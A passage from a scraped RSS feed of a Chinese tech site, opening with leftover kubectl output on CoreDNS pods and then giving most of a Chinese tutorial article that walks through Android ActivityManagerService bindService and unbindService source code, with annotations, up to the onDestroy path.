Port:                     metrics  9153/TCP
TargetPort:               9153/TCP
Endpoints:                10.244.2.95:9153,10.244.0.5:9153
Session Affinity:         None
Internal Traffic Policy:  Cluster
Events:                   &lt;none&gt;
[root@control ~]# kubectl get pods -A -l k8s-app=kube-dns -o wide
NAMESPACE     NAME                       READY   STATUS    RESTARTS      AGE   IP            NODE      NOMINATED NODE   READINESS GATES
kube-system   coredns-55d5858888-f5k2q   1/1     Running   1 (56m ago)   14h   10.244.2.95   node2     &lt;none&gt;           &lt;none&gt;
kube-system   coredns-55d5858888-xtgqg   1/1     Running   1 (56m ago)   14h   10.244.0.5    control   &lt;none&gt;           &lt;none&gt;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540157.html</guid><pubDate>Fri, 31 Oct 2025 07:26:25 +0000</pubDate></item><item><title>Android Framework AMS（09）service组件分析-3(bindService和unbindService关键流程分析)</title><link>https://www.ppmy.cn/news/1540158.html</link><description>该系列文章总纲链接：专题总纲目录 Android Framework 总纲
本章关键点总结 &amp; 说明：
说明：上上一章节主要解读应用层service组件启动的2种方式startService和bindService，以及从APP层到AMS调用之间的打通。上一章节我们关注了service组件启动方式的一种：startService启动方式。本章节主要关注service组件启动方式的另一种：bindService启动方式，分析关键API为service组件的bindService和unbindService方法。
我们从AMS.bindService和AMS.unbindService分别来分析，分析的主要流程为：
AMS.bindService-&gt;service组件onCreate、onBind
AMS.unbindService-&gt;service组件onUnBind、onDestroy
接下来开始详细解读。
1 AMS.bindService流程解读(onCreate、onBind)
AMS.bindService代码实现如下：
//ActivityManagerServicepublic int bindService(IApplicationThread caller, IBinder token,Intent service, String resolvedType,IServiceConnection connection, int flags, int userId) {// 检查调用者是否是隔离的进程，如果不是，则抛出安全异常enforceNotIsolatedCaller("bindService");//...synchronized(this) {return mServices.bindServiceLocked(caller, token, service, resolvedType,connection, flags, userId);}}
这里调用了ActivityService的bindServiceLocked方法，代码实现如下：
//ActivityService//关键流程：step1int bindServiceLocked(IApplicationThread caller, IBinder token,Intent service, String resolvedType,IServiceConnection connection, int flags, int userId) {// 获取请求绑定服务的客户端应用记录final ProcessRecord callerApp = mAm.getRecordForAppLocked(caller);//...// 如果token不为空，尝试获取对应的Activity记录ActivityRecord activity = null;if (token != null) {activity = ActivityRecord.isInStackLocked(token);//...}// 获取客户端为服务绑定设置的标签和PendingIntentint clientLabel = 0;PendingIntent clientIntent = null;// 如果调用者是系统进程，尝试获取客户端Intent和标签if (callerApp.info.uid == Process.SYSTEM_UID) {try {clientIntent = service.getParcelableExtra(Intent.EXTRA_CLIENT_INTENT);} catch (RuntimeException e) {}if (clientIntent != null) {clientLabel = service.getIntExtra(Intent.EXTRA_CLIENT_LABEL, 0);if (clientLabel != 0) {// 如果设置了客户端标签，创建一个新的Intent用于服务绑定service = service.cloneFilter();}}}// 如果设置了BIND_TREAT_LIKE_ACTIVITY标志，检查调用者是否有MANAGE_ACTIVITY_STACKS权限if ((flags &amp; Context.BIND_TREAT_LIKE_ACTIVITY) != 0) {mAm.enforceCallingPermission(android.Manifest.permission.MANAGE_ACTIVITY_STACKS,"BIND_TREAT_LIKE_ACTIVITY");}// 判断调用者是否在前台运行final boolean callerFg = callerApp.setSchedGroup != Process.THREAD_GROUP_BG_NONINTERACTIVE;// 查找服务记录ServiceLookupResult res =retrieveServiceLocked(service, resolvedType,Binder.getCallingPid(), Binder.getCallingUid(), userId, true, callerFg);// 如果服务记录为空或未找到服务，返回0或-1if (res == null) {return 0;}if (res.record == null) {return -1;}ServiceRecord s = res.record;// 清除调用者的身份信息，以便在操作过程中不泄露调用者的信息final long origId = Binder.clearCallingIdentity();try {// 如果服务需要重启，取消重启计划if (unscheduleServiceRestartLocked(s, callerApp.info.uid, false)) {}// 如果设置了BIND_AUTO_CREATE标志，更新服务最后活跃的时间if ((flags &amp; Context.BIND_AUTO_CREATE) != 0) {s.lastActivity = SystemClock.uptimeMillis();if (!s.hasAutoCreateConnections()) {ProcessStats.ServiceState stracker = s.getTracker();if (stracker != null) {stracker.setBound(true, mAm.mProcessStats.getMemFactorLocked(),s.lastActivity);}}}// 启动与服务的关联mAm.startAssociationLocked(callerApp.uid, callerApp.processName,s.appInfo.uid, s.name, s.processName);// 检索服务的应用绑定记录AppBindRecord b = s.retrieveAppBindingLocked(service, callerApp);// 创建新的连接记录ConnectionRecord c = new ConnectionRecord(b, activity,connection, flags, clientLabel, clientIntent);// 获取连接的BinderIBinder binder = connection.asBinder();// 获取服务的连接列表ArrayList&lt;ConnectionRecord&gt; clist = s.connections.get(binder);if (clist == null) {clist = new ArrayList&lt;ConnectionRecord&gt;();s.connections.put(binder, clist);}// 将连接记录添加到服务的连接列表中clist.add(c);b.connections.add(c);// 如果有Activity记录，将其添加到Activity的连接列表中if (activity != null) {if (activity.connections == null) {activity.connections = new HashSet&lt;ConnectionRecord&gt;();}activity.connections.add(c);}b.client.connections.add(c);// 如果设置了BIND_ABOVE_CLIENT标志，标记客户端有高于自身的服务绑定if ((c.flags &amp; Context.BIND_ABOVE_CLIENT) != 0) {b.client.hasAboveClient = true;}// 如果服务的应用记录不为空，更新服务的客户端活动if (s.app != null) {updateServiceClientActivitiesLocked(s.app, c, true);}// 获取全局服务连接列表clist = mServiceConnections.get(binder);if (clist == null) {clist = new ArrayList&lt;ConnectionRecord&gt;();mServiceConnections.put(binder, clist);}clist.add(c);// 如果设置了BIND_AUTO_CREATE标志，启动服务if ((flags &amp; Context.BIND_AUTO_CREATE) != 0) {s.lastActivity = SystemClock.uptimeMillis();//关键方法：拉起服务if (bringUpServiceLocked(s, service.getFlags(), callerFg, false) != null) {return 0;}}// 如果服务的应用记录不为空，根据标志更新服务的属性if (s.app != null) {if ((flags &amp; Context.BIND_TREAT_LIKE_ACTIVITY) != 0) {s.app.treatLikeActivity = true;}// 更新服务的最近最少使用状态和内存调整mAm.updateLruProcessLocked(s.app, s.app.hasClientActivities|| s.app.treatLikeActivity, b.client);mAm.updateOomAdjLocked(s.app);}// 如果服务的应用记录不为空且Intent已接收，连接客户端if (s.app != null &amp;&amp; b.intent.received) {try {c.conn.connected(s.name, b.intent.binder);} catch (Exception e) {// 异常处理代码...}// 如果Intent只有一个绑定且需要重新绑定，请求服务绑定if (b.intent.apps.size() == 1 &amp;&amp; b.intent.doRebind) {requestServiceBindingLocked(s, b.intent, callerFg, true);}} else if (!b.intent.requested) {// 如果Intent未请求，请求服务绑定requestServiceBindingLocked(s, b.intent, callerFg, false);}// 确保服务不在启动的后台服务列表中getServiceMap(s.userId).ensureNotStartingBackground(s);} finally {// 恢复调用者的身份信息Binder.restoreCallingIdentity(origId);}// 返回1表示服务绑定成功return 1;}//关键流程：step2private final String bringUpServiceLocked(ServiceRecord r,int intentFlags, boolean execInFg, boolean whileRestarting) {// 如果服务的应用记录不为空且应用线程不为空，说明服务已经在运行，直接发送服务参数if (r.app != null &amp;&amp; r.app.thread != null) {sendServiceArgsLocked(r, execInFg, false);return null;}// 如果服务不在重启中，并且重启延迟时间大于0，则不启动服务if (!whileRestarting &amp;&amp; r.restartDelay &gt; 0) {return null;}// 如果服务在重启中，从重启服务列表中移除该服务if (mRestartingServices.remove(r)) {clearRestartingIfNeededLocked(r);}// 如果服务是延迟启动的，从延迟启动列表中移除该服务，并设置服务不再延迟if (r.delayed) {getServiceMap(r.userId).mDelayedStartList.remove(r);r.delayed = false;}// 如果用户未启动，关闭服务并返回if (mAm.mStartedUsers.get(r.userId) == null) {bringDownServiceLocked(r);return msg;}try {// 设置包停止状态为非停止状态AppGlobals.getPackageManager().setPackageStoppedState(r.packageName, false, r.userId);} catch (RemoteException e) {//...}// 判断服务是否运行在隔离进程中final boolean isolated = (r.serviceInfo.flags &amp; ServiceInfo.FLAG_ISOLATED_PROCESS) != 0;final String procName = r.processName;ProcessRecord app;// 如果服务不在隔离进程中，尝试获取已有的进程记录if (!isolated) {app = mAm.getProcessRecordLocked(procName, r.appInfo.uid, false);// 如果进程记录不为空且进程线程不为空，尝试添加包并启动服务if (app != null &amp;&amp; app.thread != null) {try {app.addPackage(r.appInfo.packageName, r.appInfo.versionCode, mAm.mProcessStats);//关键方法：实际启动服务realStartServiceLocked(r, app, execInFg);return null;} catch (RemoteException e) {//...}}} else {// 如果服务运行在隔离进程中，尝试获取隔离进程记录app = r.isolatedProc;}// 如果进程记录为空，尝试启动新进程if (app == null) {if ((app = mAm.startProcessLocked(procName, r.appInfo, true, intentFlags,"service", r.name, false, isolated, false)) == null) {bringDownServiceLocked(r);return msg;}// 如果服务运行在隔离进程中，保存隔离进程记录if (isolated) {r.isolatedProc = app;}}// 如果服务不在待处理列表中，添加到待处理列表if (!mPendingServices.contains(r)) {mPendingServices.add(r);}// 如果服务已经请求停止，取消停止请求if (r.delayedStop) {r.delayedStop = false;if (r.startRequested) {stopServiceLocked(r);}}return null;}//关键流程：step3private final void realStartServiceLocked(ServiceRecord r,ProcessRecord app, boolean execInFg) throws RemoteException {// 如果进程记录的应用线程为空，抛出远程异常if (app.thread == null) {throw new RemoteException();}// 设置服务的应用记录r.app = app;// 更新服务的最后活动时间和重启时间r.restartTime = r.lastActivity = SystemClock.uptimeMillis();// 将服务添加到应用的服务体系表中app.services.add(r);// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, execInFg, "create");// 更新进程的最近最少使用（LRU）状态mAm.updateLruProcessLocked(app, false, null);// 更新内存调整mAm.updateOomAdjLocked();boolean created = false;try {// 同步电池统计数据的更新synchronized (r.stats.getBatteryStats()) {r.stats.startLaunchedLocked();}// 确保包的dex文件已经优化mAm.ensurePackageDexOpt(r.serviceInfo.packageName);// 强制进程状态至少为服务状态app.forceProcessStateUpTo(ActivityManager.PROCESS_STATE_SERVICE);// 关键方法：通过应用线程调度服务的创建app.thread.scheduleCreateService(r, r.serviceInfo,mAm.compatibilityInfoForPackageLocked(r.serviceInfo.applicationInfo),app.repProcState);r.postNotification();// 标记服务已创建created = true;} catch (DeadObjectException e) {//...} finally {// 如果服务未创建成功，进行清理操作if (!created) {app.services.remove(r);r.app = null;// 安排服务重启scheduleServiceRestartLocked(r, false);return;}}// 请求服务的绑定requestServiceBindingsLocked(r, execInFg);// 更新服务客户端活动updateServiceClientActivitiesLocked(app, null, true);// 如果服务请求启动并且需要调用 onStartCommand，添加一个启动项if (r.startRequested &amp;&amp; r.callStart &amp;&amp; r.pendingStarts.size() == 0) {r.pendingStarts.add(new ServiceRecord.StartItem(r, false, r.makeNextStartId(),null, null));}// 发送服务参数,回调执行 onStartCommandsendServiceArgsLocked(r, execInFg, true);// 如果服务是延迟启动的，从延迟启动列表中移除if (r.delayed) {getServiceMap(r.userId).mDelayedStartList.remove(r);r.delayed = false;}// 如果服务已经请求延迟停止，取消延迟停止请求if (r.delayedStop) {r.delayedStop = false;if (r.startRequested) {stopServiceLocked(r);}}}
这一条调用关系线下来，从调用关系上依次为：
bindServiceLocked
bringUpServiceLocked
realStartServiceLocked
最后的realStartServiceLocked才是实际启动服务的方法，主要作用是确保服务在正确的进程中被创建和启动。它涉及到与应用程序线程的通信，服务状态的更新，以及服务生命周期的管理。代码中的scheduleCreateService方法用于请求应用程序线程创建服务，requestServiceBindingsLocked方法用于请求服务的绑定。到这里我们主要关注2个关键方法：
scheduleCreateService（调用service的onCreate）
requestServiceBindingsLocked（调用到service的onBind）
1.1 scheduleCreateService相关流程解读(bindService到onCreate)
这里实际上是以bindService到service组件调用onCreate的流程分析为目的。代码实现如下：
//ActivityThread//ApplicationThreadpublic final void scheduleCreateService(IBinder token,ServiceInfo info, CompatibilityInfo compatInfo, int processState) {updateProcessState(processState, false);CreateServiceData s = new CreateServiceData();s.token = token;s.info = info;s.compatInfo = compatInfo;sendMessage(H.CREATE_SERVICE, s);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case CREATE_SERVICE:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceCreate");handleCreateService((CreateServiceData)msg.obj);Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleCreateService(CreateServiceData data) {// 取消调度GC Idler，以确保在服务创建期间不会进行垃圾回收，影响服务启动性能unscheduleGcIdler();// 获取服务所在应用的LoadedApk对象，它包含了应用的加载信息LoadedApk packageInfo = getPackageInfoNoCheck(data.info.applicationInfo, data.compatInfo);Service service = null;try {// 获取ClassLoader对象，用于加载服务类java.lang.ClassLoader cl = packageInfo.getClassLoader();// 加载服务类并创建实例service = (Service) cl.loadClass(data.info.name).newInstance();} catch (Exception e) {//...}try {ContextImpl context = ContextImpl.createAppContext(this, packageInfo);context.setOuterContext(service);// 创建应用程序实例Application app = packageInfo.makeApplication(false, mInstrumentation);// 服务attach到上下文环境service.attach(context, this, data.info.name, data.token, app,ActivityManagerNative.getDefault());// 调用服务的onCreate()生命周期方法service.onCreate();// 将服务实例存储在映射中，以便后续访问mServices.put(data.token, service);// 通知AMS服务已执行完成try {ActivityManagerNative.getDefault().serviceDoneExecuting(data.token, SERVICE_DONE_EXECUTING_ANON, 0, 0);} catch (RemoteException e) {//...}} catch (Exception e) {//...}}
这段代码的主要作用是创建服务实例并初始化服务的上下文环境。它涉及到类加载、服务实例化、上下文环境的设置以及服务生命周期的管理（主要是onCreate）。代码中的CreateServiceData对象包含了创建服务所需的所有信息，如服务信息、兼容性信息等。ContextImpl对象表示服务的上下文环境，它提供了服务所需的各种资源和信息。Service对象是服务的实际实例，它实现了服务的具体功能。
1.2 requestServiceBindingsLocked相关流程分析(bindService到onBind)
这里实际上是以bindService到service组件调用onBind的流程分析为目的。代码实现如下：
//ActivityService//关键流程：step1private final void requestServiceBindingsLocked(ServiceRecord r, boolean execInFg) {// 遍历服务记录中的所有绑定记录for (int i = r.bindings.size() - 1; i &gt;= 0; i--) {// 获取服务的一个绑定记录IntentBindRecord ibr = r.bindings.valueAt(i);// 请求服务与客户端的绑定// 如果绑定失败，则中断循环，不再请求后续的绑定if (!requestServiceBindingLocked(r, ibr, execInFg, false)) {break;}}}//关键流程：step2private final boolean requestServiceBindingLocked(ServiceRecord r, IntentBindRecord i,boolean execInFg, boolean rebind) {if (r.app == null || r.app.thread == null) {return false;}// 如果服务尚未请求绑定，或者这是一次重新绑定，并且有待绑定的客户端if ((!i.requested || rebind) &amp;&amp; i.apps.size() &gt; 0) {try {// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, execInFg, "bind");// 强制服务所在进程的状态至少为服务状态r.app.forceProcessStateUpTo(ActivityManager.PROCESS_STATE_SERVICE);// 关键方法：通过服务的应用线程，调度服务的绑定操作r.app.thread.scheduleBindService(r, i.intent.getIntent(), rebind,r.app.repProcState);// 如果这不是重新绑定，则标记该服务的绑定已被请求if (!rebind) {i.requested = true;}// 标记服务已被绑定，且设置不需要重新绑定的标志i.hasBound = true;i.doRebind = false;} catch (RemoteException e) {return false;}}return true;}
这里我们主要关注requestServiceBindingLocked方法，他的主要作用是检查服务是否能够被绑定（即服务及其应用线程是否存在），如果是，则通过服务的应用线程调度服务的绑定操作。代码中的IntentBindRecord对象包含了服务绑定的详细信息，如绑定的Intent、客户端信息等。整理下，关键步骤如下：
检查服务及其应用线程是否存在。
如果服务尚未请求绑定或这是一次重新绑定，且有待绑定的客户端，则继续处理。
增加服务执行的计数，并根据是否在前台执行来更新状态。
强制服务所在进程的状态至少为服务状态。
关键方法：通过服务的应用线程调度服务的绑定操作。
如果这不是重新绑定，则标记该服务的绑定已被请求，并标记服务已被绑定。
接下来我们主要解读步骤5，scheduleBindService主要是发送消息，代码实现如下：
//ActivityThread//ApplicationThreadpublic final void scheduleBindService(IBinder token, Intent intent,boolean rebind, int processState) {updateProcessState(processState, false);BindServiceData s = new BindServiceData();s.token = token;s.intent = intent;s.rebind = rebind;sendMessage(H.BIND_SERVICE, s);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case BIND_SERVICE:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceBind");handleBindService((BindServiceData)msg.obj);Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleBindService(BindServiceData data) {Service s = mServices.get(data.token);// 如果服务实例不为空，继续处理绑定请求if (s != null) {try {// 设置Intent的类加载器为服务的类加载器，以便能正确解析其中的Serializable和Parcelable对象data.intent.setExtrasClassLoader(s.getClassLoader());// 准备Intent以进入当前进程data.intent.prepareToEnterProcess();// 尝试处理服务绑定try {// 如果这不是重新绑定，调用服务的onBind方法并发布服务的IBinder给客户端if (!data.rebind) {// 关键方法：执行service组件的onBind操作IBinder binder = s.onBind(data.intent);// 发布服务，使客户端能够与服务进行通信ActivityManagerNative.getDefault().publishService(data.token, data.intent, binder);} else {// 如果是重新绑定，调用服务的onRebind方法s.onRebind(data.intent);// 通知AMS服务重新绑定操作已完成ActivityManagerNative.getDefault().serviceDoneExecuting(data.token, SERVICE_DONE_EXECUTING_ANON, 0, 0);}ensureJitEnabled();} catch (RemoteException ex) {//...}} catch (Exception e) {//...}}}
这段代码的主要作用是处理服务的绑定请求，包括调用服务的onBind或onRebind方法，并发布服务的IBinder给客户端。代码中的BindServiceData对象包含了服务绑定请求所需的所有信息，如服务的token、Intent、是否为重新绑定等。
2 AMS.unbindService流程解读(onUnBind、onDestroy)
AMS.unbindService代码实现如下：
//ActivityManagerServicepublic boolean unbindService(IServiceConnection connection) {synchronized (this) {return mServices.unbindServiceLocked(connection);}}
这里调用了ActivityService的unbindServiceLocked方法，代码实现如下：
//ActivityService//关键流程：step1boolean unbindServiceLocked(IServiceConnection connection) {IBinder binder = connection.asBinder();// 从全局服务连接映射中获取与该Binder相关联的连接记录列表ArrayList&lt;ConnectionRecord&gt; clist = mServiceConnections.get(binder);// 如果连接记录列表为空，说明没有找到相应的服务连接，返回falseif (clist == null) {return false;}final long origId = Binder.clearCallingIdentity();try {// 遍历连接记录列表，解绑所有相关服务while (clist.size() &gt; 0) {// 获取列表中的第一个连接记录ConnectionRecord r = clist.get(0);// 关键方法：解除服务连接removeConnectionLocked(r, null, null);// 如果列表中的第一个连接记录仍然是r，说明没有被移除，手动移除它if (clist.size() &gt; 0 &amp;&amp; clist.get(0) == r) {clist.remove(0);}// 如果服务绑定记录的服务应用不为空，更新相关设置if (r.binding.service.app != null) {// 如果设置了BIND_TREAT_LIKE_ACTIVITY标志，更新服务应用的属性if ((r.flags &amp; Context.BIND_TREAT_LIKE_ACTIVITY) != 0) {r.binding.service.app.treatLikeActivity = true;// 更新服务应用的最近最少使用状态mAm.updateLruProcessLocked(r.binding.service.app,r.binding.service.app.hasClientActivities|| r.binding.service.app.treatLikeActivity, null);}// 更新服务应用的内存调整mAm.updateOomAdjLocked(r.binding.service.app);}}} finally {Binder.restoreCallingIdentity(origId);}return true;}//关键流程：step2void removeConnectionLocked(ConnectionRecord c, ProcessRecord skipApp, ActivityRecord skipAct) {IBinder binder = c.conn.asBinder();// 获取服务绑定记录AppBindRecord b = c.binding;// 获取服务记录ServiceRecord s = b.service;// 获取服务的连接列表ArrayList&lt;ConnectionRecord&gt; clist = s.connections.get(binder);// 如果连接列表不为空，移除对应的连接记录if (clist != null) {clist.remove(c);// 如果连接列表为空，从服务的连接映射中移除该Binder的条目if (clist.size() == 0) {s.connections.remove(binder);}}// 从服务绑定记录的连接列表中移除连接记录b.connections.remove(c);// 如果连接记录有关联的活动记录，且不是跳过的活动记录，则移除该连接记录if (c.activity != null &amp;&amp; c.activity != skipAct) {if (c.activity.connections != null) {c.activity.connections.remove(c);}}// 如果连接记录绑定的服务应用不是跳过的应用记录，则移除该连接记录if (b.client != skipApp) {b.client.connections.remove(c);// 如果设置了BIND_ABOVE_CLIENT标志，更新服务应用是否有高于自身的服务绑定if ((c.flags &amp; Context.BIND_ABOVE_CLIENT) != 0) {b.client.updateHasAboveClientLocked();}// 如果服务应用不为空，更新服务应用的客户端活动if (s.app != null) {updateServiceClientActivitiesLocked(s.app, c, true);}}// 从全局服务连接映射中移除连接记录clist = mServiceConnections.get(binder);if (clist != null) {clist.remove(c);// 如果连接列表为空，从全局服务连接映射中移除该Binder的条目if (clist.size() == 0) {mServiceConnections.remove(binder);}}// 停止服务应用和客户端应用之间的关联mAm.stopAssociationLocked(b.client.uid, b.client.processName, s.appInfo.uid, s.name);// 如果服务绑定记录的连接列表为空，则从服务Intent的绑定应用列表中移除该应用if (b.connections.size() == 0) {b.intent.apps.remove(b.client);}// 如果服务没有死亡，执行进一步的清理操作if (!c.serviceDead) {// 如果服务应用不为空，且没有其他绑定的应用，执行服务的unbind操作if (s.app != null &amp;&amp; s.app.thread != null &amp;&amp; b.intent.apps.size() == 0&amp;&amp; b.intent.hasBound) {try {// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(s, false, "unbind");// 如果服务应用的进程状态小于等于接收者状态，更新服务应用的最近最少使用状态if (b.client != s.app &amp;&amp; (c.flags &amp; Context.BIND_WAIVE_PRIORITY) == 0&amp;&amp; s.app.setProcState &lt;= ActivityManager.PROCESS_STATE_RECEIVER) {mAm.updateLruProcessLocked(s.app, false, null);}// 更新服务应用的内存调整mAm.updateOomAdjLocked(s.app);// 标记服务Intent没有绑定的应用b.intent.hasBound = false;b.intent.doRebind = false;// 关键方法：通知服务应用执行unbind操作s.app.thread.scheduleUnbindService(s, b.intent.intent.getIntent());} catch (Exception e) {//...serviceProcessGoneLocked(s);}}// 如果设置了BIND_AUTO_CREATE标志，且没有其他自动创建的绑定，则关闭服务if ((c.flags &amp; Context.BIND_AUTO_CREATE) != 0) {boolean hasAutoCreate = s.hasAutoCreateConnections();// 如果没有其他自动创建的绑定，则更新服务的状态跟踪器if (!hasAutoCreate) {if (s.tracker != null) {s.tracker.setBound(false, mAm.mProcessStats.getMemFactorLocked(),SystemClock.uptimeMillis());}}// 如果需要，执行服务的关闭逻辑bringDownServiceIfNeededLocked(s, true, hasAutoCreate);}}}
这里我们关注removeConnectionLocked方法，它的主要作用是移除服务连接，包括从服务的连接映射中移除连接记录、更新服务应用的客户端活动、执行服务的unbind操作以及关闭服务。代码中的ConnectionRecord对象包含了服务连接的详细信息，AppBindRecord对象包含了服务绑定的详细信息。到这里我们主要关注2个关键方法：
scheduleUnbindService（调用service的onUnbind）
bringDownServiceIfNeededLocked（调用到service的onDestroy）
2.1 scheduleUnbindService相关流程解读（unbindservice到onUnbind）
这里实际上是以unbindService到service组件调用onUnbind的流程分析为目的。这里主要是通过scheduleUnbindService方法发送消息，处理解绑操作。该方法代码实现如下：
//ActivityThread//ApplicationThreadpublic final void scheduleUnbindService(IBinder token, Intent intent) {BindServiceData s = new BindServiceData();s.token = token;s.intent = intent;sendMessage(H.UNBIND_SERVICE, s);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case UNBIND_SERVICE:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceUnbind");handleUnbindService((BindServiceData)msg.obj);Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleUnbindService(BindServiceData data) {Service s = mServices.get(data.token);if (s != null) {try {// 设置Intent的类加载器为服务的类加载器，以便能正确解析其中的Serializable和Parcelable对象data.intent.setExtrasClassLoader(s.getClassLoader());// 准备Intent以进入当前进程data.intent.prepareToEnterProcess();// 调用服务的onUnbind方法，询问服务是否需要重新绑定boolean doRebind = s.onUnbind(data.intent);// 如果服务需要重新绑定，通知ActivityManager服务解绑已完成，并标记为需要重新绑定if (doRebind) {ActivityManagerNative.getDefault().unbindFinished(data.token, data.intent, doRebind);} else {// 如果服务不需要重新绑定，通知ActivityManager服务解绑操作已完成ActivityManagerNative.getDefault().serviceDoneExecuting(data.token, SERVICE_DONE_EXECUTING_ANON, 0, 0);}} catch (Exception e) {//...}}}
handleUnbindService方法的主要作用是处理服务的解绑请求，包括调用服务的onUnbind方法，并根据服务的响应通知ActivityManager服务解绑已完成代码中的BindServiceData对象包含了服务解绑请求所需的所有信息，如服务的token、Intent等。
2.2 bringDownServiceIfNeededLocked相关流程解读（unbindservice到onDestroy）
这里实际上是以unbindService到service组件调用onDestroy的流程分析为目的。这里主要是通过bringDownServiceIfNeededLocked方法进行destroy相关操作。
注意：
针对仅通过 bindService() 绑定的服务，在执行 unbindService() 操作时，onDestroy() 方法不一定会被调用。
针对bind方式启动的service组件。onDestroy() 方法是否会被调用一般取决于以下条件：
所有绑定都已解除：如果服务只通过 bindService() 绑定，并且所有绑定都已解除（即没有任何 ServiceConnection 再与该服务绑定），那么服务将被销毁，onDestroy() 方法会被调用。
服务未延迟停止：如果服务没有设置延迟停止的标志（例如，没有在 onUnbind() 方法中返回 true），那么在所有绑定都解除后，服务将直接停止，onDestroy() 方法会被调用。
如果服务在 onUnbind() 方法中返回 true，表示服务希望在解绑后重新绑定，那么服务不会立即销毁，onDestroy() 方法也不会被调用。在这种情况下，如果服务在未来被重新绑定，onBind() 方法将再次被调用。
总结来说，对于仅通过 bindService() 绑定的服务，如果所有绑定都已解除，并且没有其他机制（如 onUnbind() 返回 true）阻止服务销毁，那么 onDestroy() 方法会被调用。这是服务生命周期的一部分，确保服务在不再需要时能够正确地清理资源。
有了这个了解后，我们继续分析bringDownServiceIfNeededLocked方法，代码实现如下：
//ActivityService//关键流程：step1private final void bringDownServiceIfNeededLocked(ServiceRecord r, boolean knowConn, boolean hasConn) {// 检查服务是否仍然需要如果服务仍然需要，例如服务正在运行或者有待处理的启动请求，则不停止服务并直接返回if (isServiceNeeded(r, knowConn, hasConn)) {return;}// 如果服务在待处理列表中，说明服务的启动请求还在处理中，因此不停止服务if (mPendingServices.contains(r)) {return;}// 如果服务不再需要且不在待处理列表中，则停止服务bringDownServiceLocked(r);}//关键流程：step2private final void bringDownServiceLocked(ServiceRecord r) {// 通知所有绑定到该服务的客户端，服务已经死亡for (int conni = r.connections.size() - 1; conni &gt;= 0; conni--) {ArrayList&lt;ConnectionRecord&gt; c = r.connections.valueAt(conni);for (int i = 0; i &lt; c.size(); i++) {ConnectionRecord cr = c.get(i);// 标记服务为死亡状态cr.serviceDead = true;try {// 通知客户端服务已经死亡cr.conn.connected(r.name, null);} catch (Exception e) {//...}}}// 如果服务已经被应用bind，通知应用服务已经被unbind// 本次分析不涉及bind和unbind操作，因此忽略即可if (r.app != null &amp;&amp; r.app.thread != null) {for (int i = r.bindings.size() - 1; i &gt;= 0; i--) {IntentBindRecord ibr = r.bindings.valueAt(i);if (ibr.hasBound) {try {// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, false, "bring down unbind");// 更新内存调整mAm.updateOomAdjLocked(r.app);// 标记服务为未绑定状态ibr.hasBound = false;// 通知应用服务已经被解绑r.app.thread.scheduleUnbindService(r, ibr.intent.getIntent());} catch (Exception e) {// 异常处理代码...serviceProcessGoneLocked(r);}}}}// 记录服务销毁的时间r.destroyTime = SystemClock.uptimeMillis();// 获取服务映射对象final ServiceMap smap = getServiceMap(r.userId);// 从服务映射中移除服务smap.mServicesByName.remove(r.name);smap.mServicesByIntent.remove(r.intent);// 重置服务的总重启次数r.totalRestartCount = 0;// 取消服务的重启计划unscheduleServiceRestartLocked(r, 0, true);// 从待处理服务列表中移除服务for (int i = mPendingServices.size() - 1; i &gt;= 0; i--) {if (mPendingServices.get(i) == r) {mPendingServices.remove(i);}}// 取消服务的通知r.cancelNotification();// 标记服务不在前台r.isForeground = false;// 重置前台服务的IDr.foregroundId = 0;// 重置前台通知r.foregroundNoti = null;// 清除已交付的启动请求r.clearDeliveredStartsLocked();// 清除待处理的启动请求r.pendingStarts.clear();// 如果服务所属的应用还存在if (r.app != null) {// 同步电池统计数据的更新synchronized (r.stats.getBatteryStats()) {r.stats.stopLaunchedLocked();}// 从应用的服务列表中移除服务r.app.services.remove(r);// 如果应用线程还存在，更新服务的前台状态if (r.app.thread != null) {updateServiceForegroundLocked(r.app, false);try {// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, false, "destroy");// 添加服务到正在销毁的服务列表中mDestroyingServices.add(r);// 标记服务为正在销毁状态r.destroying = true;// 更新内存调整mAm.updateOomAdjLocked(r.app);// 关键方法：通知应用销毁服务r.app.thread.scheduleStopService(r);} catch (Exception e) {// 异常处理代码...}}}// 清除服务的绑定if (r.bindings.size() &gt; 0) {r.bindings.clear();}// 如果服务有重启器，设置服务为nullif (r.restarter instanceof ServiceRestarter) {((ServiceRestarter) r.restarter).setService(null);}int memFactor = mAm.mProcessStats.getMemFactorLocked();long now = SystemClock.uptimeMillis();// 如果服务有状态跟踪器，设置服务为未启动和未绑定状态if (r.tracker != null) {r.tracker.setStarted(false, memFactor, now);r.tracker.setBound(false, memFactor, now);// 如果服务的执行嵌套计数为0，清除当前所有者if (r.executeNesting == 0) {r.tracker.clearCurrentOwner(r, false);r.tracker = null;}}// 确保服务不在启动的后台服务列表中smap.ensureNotStartingBackground(r);}
这里最后的bringDownServiceLocked才是实际关闭服务的方法，它的作用是关闭服务并执行相关的清理工作。它涉及到服务绑定的清理（如果bind则执行unbind操作，主要针对bindservice操作，本次分析不涉及）、服务执行计数的更新、服务状态的更新、服务通知的取消以及服务销毁逻辑的调用。接下来我们关注unbindService的通知应用销毁服务的关键方法scheduleStopService,代码实现如下：
